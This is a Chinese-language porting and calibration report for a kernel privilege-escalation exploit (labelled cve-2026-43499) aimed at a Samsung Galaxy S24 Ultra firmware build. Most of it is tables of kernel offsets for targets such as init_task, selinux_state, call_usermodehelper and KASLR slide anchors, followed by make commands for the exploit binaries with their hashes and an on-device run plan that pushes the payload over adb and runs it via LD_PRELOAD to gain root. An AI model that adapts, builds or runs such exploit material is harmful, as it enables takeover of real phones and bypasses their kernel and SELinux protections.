# SM-S928B（欧版 S24 Ultra）BYD9（One UI 7.0 / Android 15） 内核分析报告

> 日期：2026-10-24
> 状态：**自动定标完成，载荷 104,128 B 已构建，待真机验证**（尚未接入 App / 未做 KernelSU 专属驱动）
> 目标：`02_exploit工程/fusion-s24u/src/targets/e3q-S928BXXU4BYD9/`
> 素材：`devices_ports/eur_oneui7.0_byd9_boot.img`（sha256 `67af36ff15483d6aa79fb1af5bfb5fff4dc1454d8b7de995990b85028e9d41cc`；源包 `/home/nt/下载/s24uboot.img` 内 `boot-S928BXXU4BYD9-Android 15.img`）
> 内核：`6.1.99-android14-11-30958380-abS928BXXU4BYD9`（构建号 30958380，raw ARM64 Image 36,952,576 B）
> 模板（参考）：`e3q-S9280ZCS4CZA1`（e3q 平台 6.1.128）
> 恢复 ELF：`devices_ports/byd9_unpacked/vmlinux_byd9.elf`（41,854,579 B）

---

## 1. 定标方法（自动化）

本机新增通用定标器 `02_exploit工程/fusion-s24u/tools/calibrate_target.py`，把
`ADAPTATION_GUIDE.md` 阶段 1/2 全部自动化，一条命令完成：

1. `llvm-nm` 取模板 ELF / 目标 ELF 符号表；
2. 模板 `target.h` 的 `*_OFF` 宏按 **符号身份** 迁移（模板值 + `KIMAGE_TEXT_BASE`
   命中模板符号 → 按同名符号在目标 ELF 回查）；平台差异导致的符号改名有候选回退
   （如 `ashmem_miscs` → `ashmem_misc`）；
3. **镜像派生** 项按结构规则实测：
   - `ASHMEM_MISC_FOPS_OFF` / `SLIDE_S928_PROBE_TARGET_IMAGE_OFF` = `ashmem_misc(s)+0x10`
     （并回读该槽 qword 校验 == `ashmem_fops`）；
   - `SLIDE_RANDOM_BOOT_ID_DATA_OFF` = `random_table+0x108`（回读校验 == `sysctl_bootid`）；
   - `SLIDE_TRACEFS_WORKER_CALLER_OFF` = `worker_thread+0xA0`；
   - `SLIDE_NFULNL_LOGGER_OFF` = 镜像内 `nfnetlink_log\0` 字符串地址（与 `nfulnl_logger.name` 双重验证）；
   - `SLIDE_TRACEFS_EVENT_ID` = `(__event_sched_blocked_reason - __start_ftrace_events)/8 + 20`；
4. 其余结构体字段/调优常量沿用模板，并用**目标内核自带 BTF** 逐项实测核对；
5. 生成 `target.h` + `p0_fingerprint.h`（RMG `generate_p0_fingerprint.pl`，256 qword 自校验）；
6. 输出审计 TSV 与 Markdown 报告（`02_exploit工程/fusion-s24u/work_S928B_offsets/byd9/`）。

**审计结果：0 未解析、0 BTF 不符。**

## 2. 符号身份迁移（20 项）

## 1. 符号身份迁移（20 项）

| 宏 | 模板 | 新值 | Δ | 符号 |
|---|---|---|---|---|
| `ANON_PIPE_BUF_OPS_OFF` | 0x0011b6bd0 | 0x0011a4490 | -0x12740 | `anon_pipe_buf_ops` |
| `ASHMEM_COMPAT_IOCTL_OFF` | 0x000cda1fc | 0x000cd6350 | -0x3eac | `compat_ashmem_ioctl` |
| `ASHMEM_FOPS_OFF` | 0x00135e7b0 | 0x00134bc98 | -0x12b18 | `ashmem_fops` |
| `ASHMEM_IOCTL_OFF` | 0x000cd98c4 | 0x000cd5a68 | -0x3e5c | `ashmem_ioctl` |
| `ASHMEM_MMAP_OFF` | 0x000cda254 | 0x000cd63a8 | -0x3eac | `ashmem_mmap` |
| `ASHMEM_OPEN_OFF` | 0x000cda480 | 0x000cd65d4 | -0x3eac | `ashmem_open` |
| `ASHMEM_RELEASE_OFF` | 0x000cda508 | 0x000cd665c | -0x3eac | `ashmem_release` |
| `ASHMEM_SHOW_FDINFO_OFF` | 0x000cda628 | 0x000cd677c | -0x3eac | `ashmem_show_fdinfo` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | 0x0000d308c | 0x0000d58f4 | +0x2868 | `call_usermodehelper_exec_work` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | 0x00046e1f0 | 0x00046dc10 | -0x5e0 | `configfs_bin_write_iter` |
| `CONFIGFS_READ_ITER_OFF` | 0x00046dcc0 | 0x00046d6e0 | -0x5e0 | `configfs_read_iter` |
| `COPY_SPLICE_READ_OFF` | 0x0003ec2c8 | 0x0003ec12c | -0x19c | `generic_file_splice_read` |
| `INIT_TASK_OFF` | 0x00216f8c0 | 0x00215f040 | -0x10880 | `init_task` |
| `KMALLOC_CACHES_OFF` | 0x0016d0db8 | 0x0016ba938 | -0x16480 | `kmalloc_caches` |
| `NOOP_LLSEEK_OFF` | 0x00039e518 | 0x00039e594 | +0x7c | `noop_llseek` |
| `ROOT_TASK_GROUP_OFF` | 0x00235cd80 | 0x00234bd80 | -0x11000 | `root_task_group` |
| `SELINUX_ENFORCING_OFF` | 0x002431460 | 0x002420440 | -0x11020 | `selinux_state` |
| `SLIDE_LOGGERS_0_1_OFF` | 0x002162a20 | 0x002152a18 | -0x10008 | `nfulnl_logger` |
| `SLIDE_SYSCTL_BOOTID_OFF` | 0x0024d35a8 | 0x0024c2628 | -0x10f80 | `sysctl_bootid` |
| `SYSTEM_UNBOUND_WQ_OFF` | 0x00215ae60 | 0x00214ae60 | -0x10000 | `system_unbound_wq` |

## 3. 镜像派生（6 项）


| 宏 | 新值 | 证据 |
|---|---|---|
| `ASHMEM_MISC_FOPS_OFF` | 0x22beea8ULL | ashmem_misc+0x10；内容 qword=0xffffffc00934bc98 vs ashmem_fops=0xffffffc00934bc98 ✓ |
| `SLIDE_NFULNL_LOGGER_OFF` | 0x1605b1eULL | nfulnl_logger@0x2152a18.name=0xffffffc009605b1e → 0x001605b1e；镜像唯一字符串命中 ['0x1605b1e'] ✓ |
| `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | 0x227a2d0ULL | random_table+0x108；内容 qword=0xffffffc00a4c2628 vs sysctl_bootid=0xffffffc00a4c2628 ✓ |
| `SLIDE_S928_PROBE_TARGET_IMAGE_OFF` | 0x22beea8ULL | ashmem_misc+0x10；内容 qword=0xffffffc00934bc98 vs ashmem_fops=0xffffffc00934bc98 ✓ |
| `SLIDE_TRACEFS_EVENT_ID` | 106 | 索引=(0xffffffc00a10f6b8-0xffffffc00a10f408)/8=86；+20 → id=106 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | 0x000dd03cULL | worker_thread+0xa0 |

## 4. 沿用模板项与 BTF 实测

**沿用模板项（112 项，6.1 KMI 冻结的结构体字段/调优常量）**

其中 **48 项已用目标内核自带 BTF 实测核对通过**。

**跨 target 体检发现差异（需人工确认）：**

- `MM_STRUCT_SZ`：e3q-S9280ZHS6DZE2=0x400(Δ+0x40); e3q-S928BXXU6EZIF=0x400(Δ+0x40); e3q-S9280ZCS6DZF2=0x400(Δ+0x40)

## 5. 构建验证

```bash
cd /home/nt/项目/samsung_root_research/02_exploit工程/fusion-s24u
ANDROID_NDK_HOME=/home/nt/项目/samsung_root_research/06_工具链/android-ndk-r29 \
  make TARGET=e3q-S928BXXU4BYD9 stable all
```

| 产物 | 大小 | sha256 |
|---|---|---|
| `cve-2026-43499-app.stable.so` | 104,128 B | `f03dd8f25fb75592112361d2d961144aab29c3ec3cf16d70dc3a5fa729465e2d` |
| `cve-2026-43499-app.so` | 127,392 B | `5520dd21e95aae4f2879471e3e0edf6d519e82ab4b615a5193fc694c042d7094` |
| `cve-2026-43499-root` | 27,496 B | `d2dccd05d027fde632301613e65337274ef72f395173d6ffb48ceef50babba19` |
| `cve-2026-43499` | 97,176 B | `bc1a657c8363a7b1d288104b1c70535c8f39e2900d503b0f7764420cb35c8bf2` |

- `target.h` sha256 `ecc3ef30fce12758f789a1ded91e17244b76e230e9649ef2f99a0d4f56247d0e`；`p0_fingerprint.h` sha256 `5c545e2d89cdb18ed8feebfc78b6d513c93c7064f024d3e3457c4035a27fa179`
- 内嵌标签 `e3q-S928BXXU4BYD9-app-physical-p0-oracle`；编译无 error（仅 `root.c` 一个既有 unused-function 警告）

## 6. 待真机验证清单

1. `adb push` `cve-2026-43499-app.stable.so`（改名 `cve-2026-43499`）+ `cve-2026-43499-root` 到 `/data/local/tmp`，
   按指南 §8.1 以 shell 域 `LD_PRELOAD` 运行（24 次尝试）；
2. 失败时按 §8.4 分类回报日志（重点看 `slide-kaslr-ok` / `pipe caches` / `root umh result`）；
3. 顺手采集：
   - `getprop ro.build.fingerprint`（回填 `target.h` 里的占位指纹）；
   - `cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id`（复核 `SLIDE_TRACEFS_EVENT_ID`）；
   - 若 mm 相关阶段异常，记录实际 spray 尺寸以确认 `MM_STRUCT_SZ`（BTF 实测 `sizeof(mm_struct)=0x3c0`，
     与模板一致；DZE2/EZIF 载荷用 0x400 是调优差异）。

## 7. 产物索引

| 文件 | 说明 |
|---|---|
| `devices_ports/eur_oneui7.0_byd9_boot.img` | 原始 boot（100,663,296 B，gitignore） |
| `devices_ports/byd9_unpacked/kernel` | 解出的 raw ARM64 Image（36,952,576 B） |
| `devices_ports/byd9_unpacked/vmlinux_byd9.elf` | 恢复的带符号 ELF（41,854,579 B） |
| `devices_ports/byd9_unpacked/vmlinux_byd9.btf` | 内核自带 BTF（结构体实测素材） |
| `devices_ports/byd9_draft/` | 草案：`target.h.draft`、`p0_fingerprint.h`、三件载荷 |
| `02_exploit工程/fusion-s24u/src/targets/e3q-S928BXXU4BYD9/` | 正式 target（可直接 `make`） |
| `02_exploit工程/fusion-s24u/work_S928B_offsets/byd9/` | 定标报告 + 审计 TSV + nm 符号表 |
